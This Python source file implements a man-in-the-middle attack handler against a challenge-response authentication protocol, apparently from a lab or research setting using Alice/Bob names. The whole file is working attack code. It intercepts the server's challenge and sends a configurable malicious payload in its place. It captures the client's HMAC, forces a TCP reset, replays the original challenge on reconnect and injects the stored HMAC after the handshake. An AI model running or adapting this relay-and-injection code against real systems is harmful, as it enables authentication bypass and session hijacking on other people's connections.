import binascii
import asyncio
import socket
import struct

class MitmAttackHandler:
    def __init__(self, direction_name, payload_handler):
        self.direction_name = direction_name
        self.payload_handler = payload_handler
        self.attack_enabled = payload_handler.is_attack_mode_enabled(direction_name)
        self.attack_payload_hex = payload_handler.get_attack_payload(direction_name)
        self.attack_log = payload_handler.should_log_attack(direction_name)
        self.state = {
            'active': False,
            'stored_challenge': None,
            'stored_hmac': None,
            'injected': False,
            'phase': None,
            'original_challenge': None,
            'original_hmac': None,
            'replay_ready': False,
            'connection_count': 0
        }
        if self.attack_enabled and self.attack_log:
            print(f"[MITM] Attack mode enabled for direction {direction_name}")

    def force_tcp_rst(self, writer):
        """Force a TCP RST by setting SO_LINGER to 0 and closing the socket"""
        try:
            sock = writer.get_extra_info('socket')
            if sock:
                # Set SO_LINGER to 0 to force RST instead of FIN
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                if self.attack_log:
                    print(f"[MITM] Forcing TCP RST by setting SO_LINGER to 0")
        except Exception as e:
            if self.attack_log:
                print(f"[MITM] Error setting SO_LINGER: {e}")

    async def process_message(self, raw_msg, original_data, writer):
        should_forward = True
        if not self.attack_enabled:
            return should_forward
            
        # Log all messages for debugging
        if self.attack_log:
            print(f"[MITM] Processing message: {type(raw_msg)} - {str(raw_msg)[:100]}")
            
        # Detect challenge from server (Bob)
        if isinstance(raw_msg, str) and raw_msg.startswith('#CHALLENGE#'):
            if not self.state['active']:
                self.state['active'] = True
                self.state['phase'] = 'waiting_hmac'
                self.state['original_challenge'] = original_data
                self.state['connection_count'] += 1
                if self.attack_log:
                    print(f"[MITM] Intercepted challenge on connection #{self.state['connection_count']}: {raw_msg}")
                # Instead of forwarding Bob's challenge, send our own malicious challenge
                try:
                    malicious_bytes = binascii.unhexlify(self.attack_payload_hex)
                    if self.attack_log:
                        print(f"[MITM] Sending malicious payload: {malicious_bytes[:50].hex()}...")
                except Exception as e:
                    print(f"[MITM] Error decoding malicious payload: {e}")
                    malicious_bytes = b''
                writer.write(malicious_bytes)
                await writer.drain()
                if self.attack_log:
                    print(f"[MITM] Sent malicious challenge to client.")
                return False
                
        # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
        elif self.state['active'] and self.state['phase'] == 'waiting_hmac' and isinstance(raw_msg, (bytes, str)):
            self.state['stored_hmac'] = original_data
            self.state['phase'] = 'waiting_reconnect'
            if self.attack_log:
                print(f"[MITM] Stored HMAC from client: {str(raw_msg)[:50]}. Forcing TCP RST.")
            # Force TCP RST instead of graceful close
            self.force_tcp_rst(writer)
            writer.close()
            await writer.wait_closed()
            return False
            
        # After reconnect, replay original challenge
        elif self.state['active'] and self.state['phase'] == 'waiting_reconnect' and self.state['original_challenge']:
            if self.attack_log:
                print(f"[MITM] Replaying original challenge after reconnect.")
            writer.write(self.state['original_challenge'])
            await writer.drain()
            self.state['phase'] = 'waiting_welcome'
            if self.attack_log:
                print(f"[MITM] Replayed original challenge to client after reconnect.")
            return False
            
        # After handshake, inject malicious payload
        elif self.state['active'] and self.state['phase'] == 'waiting_welcome' and isinstance(raw_msg, str) and raw_msg.startswith('#WELCOME#'):
            if not self.state['injected'] and self.state['stored_hmac']:
                if self.attack_log:
                    print(f"[MITM] Injecting stored HMAC and malicious payload after handshake.")
                writer.write(self.state['stored_hmac'])
                await writer.drain()
                if self.attack_log:
                    print(f"[MITM] Injected stored HMAC and malicious payload after handshake.")
                self.state['injected'] = True
            return True
            
        # If we're in attack mode but haven't seen a challenge yet, just forward normally
        elif self.state['active'] and self.state['phase'] is None:
            if self.attack_log:
                print(f"[MITM] Waiting for challenge, forwarding message normally.")
            return True
            
        return should_forward 